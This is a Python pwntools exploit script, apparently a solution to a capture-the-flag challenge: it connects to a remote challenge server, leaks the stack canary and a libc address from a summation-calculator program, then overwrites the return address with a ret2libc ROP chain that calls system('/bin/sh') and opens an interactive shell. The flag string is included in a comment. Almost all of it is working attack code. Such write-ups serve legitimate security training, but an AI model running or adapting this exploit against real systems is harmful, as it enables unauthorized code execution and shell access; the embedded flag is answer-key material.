from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = 'chall'
elf = ELF(program,checksec=False)
lokal = False
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = elf.process()
    libc = elf.libc
else:
    host = 'chall.codepwnda.id'
    port = '17011'
    xp = remote(host,port)
    # libc = elf.libc
    libc = ELF("libc-2.31.so",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = "b *0x555555554ad5 \n c"
    gdb.attach(xp,cmd)

#Exploit Here

#signed to unsigned
def uns(x):
   if(x < 0):
       x += 2**32
   return x

#unsigned to signed
def ununs(x):
   if(x > 0x7fffffff):
       x -= 2**32
   return x

def memset(offset):
	for y in range(2):
		sla("n: ",str(offset+y))
		for i in range(offset+y):
			sla(". ","0")
		sla("? ","Y")

def leak(offset):
	tmp = []
	for y in range(2):
		sla("n: ",str(offset+y))
		for i in range(offset+y):
			sla(". ","+")
		ru("= ")
		lk = int(xp.recvline()[:-1])
		# print lk
		sla("? ","Y")
		tmp.append(uns(lk))
		# print tmp
	tmp[1]=uns(tmp[1]-tmp[0])
	addr = tmp[1] << 32 | tmp[0]
	return addr

def overwrite(offset,target):
	tmp = [target >> (8*4), target & 0xffffffff]
	tmp = [ununs(i) for i in tmp]
	tmp = tmp[::-1]
	for y in range(2):
		sla("n: ",str(offset+y))
		for i in range(offset-1+y):
			sla(". ","+")
		sla(". ",str(tmp[y]))
		sla("? ","Y")


memset(17)
canary = leak(19)
print "canary = "+hex(canary)

memset(19)
memset(21)

libcleak = leak(23)
print "Libc leak= "+hex(libcleak)

libc.address = libcleak - 0x270b3
print "Libc base = "+hex(libc.address)
system = libc.symbols['system']
print "Libc system = "+hex(system)

binsh = libc.search('/bin/sh').next()

ret = libc.address+0x0000000000026ba0
pop_rdi = libc.address + 0x0000000000026b72

overwrite(23,pop_rdi)
overwrite(25,binsh)
overwrite(27,ret)
overwrite(29,system)

overwrite(19,canary)

sla("n: ","0")
sla("? ","n")

#hacktoday{whoa_u_pwned_a_summation_calculator_XD__dk3nm}

xp.interactive()
